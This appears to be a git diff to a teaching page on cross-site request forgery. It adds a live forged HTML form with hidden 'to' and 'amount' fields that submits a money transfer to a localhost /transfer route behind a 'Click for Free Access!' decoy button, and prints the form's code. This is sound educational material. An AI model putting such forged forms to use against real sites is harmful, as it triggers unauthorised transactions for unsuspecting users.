@@ -19,8 +19,24 @@
     <br>
     <hr />
     <h3>Exploiting POST route</h3>
-    <p>To target the <code>POST /transfer</code> route, a malicious attacker can simply create a fake HTML form that submits a bunch of hidden fields that provides the values needed to perform the unintentional transfer.</p>
-    <p>TODO</p>
+    <p>To target the <code>POST /transfer</code> route, a malicious attacker can simply create a fake HTML form that submits a
+      bunch of hidden fields that provides the values needed to perform the unintentional transfer.</p>
+    <form id="malicious-form" action="http://localhost:3000/transfer" method="POST">
+      <input type="text" name="to" value="Alice" hidden=True>
+      <input type="text" name="amount" value="25" hidden=True>
+      <input type="submit" value="Click for Free Access!" style="background:#c73e3e;width:25%;">
+    </form>
+    <p>The code behind the above form is as follows:</p>
+    <pre>
+        <code>
+        &lt;form action="http://localhost:3000/transfer" method="POST"&gt;
+          &lt;input type="text" name="to" value="Alice" hidden=True&gt;
+          &lt;input type="text" name="amount" value="25" hidden=True&gt;
+          &lt;input type="submit" value="Click for Free Access!"&gt;
+        &lt;/form&gt;
+      </code>
+    </pre>
+    <p>Notice that the relevant fields for making the transfer successful are <code>hidden</code>, which is why it's not displayed.</p>
     <hr />
     <p>CSRF Attacks can be combined and integrated with other web exploits like clickjacking or phishing to make a victim click
       a seemingly harmless link. But appearances can be devicing, are often are in web security. More context and defenses are
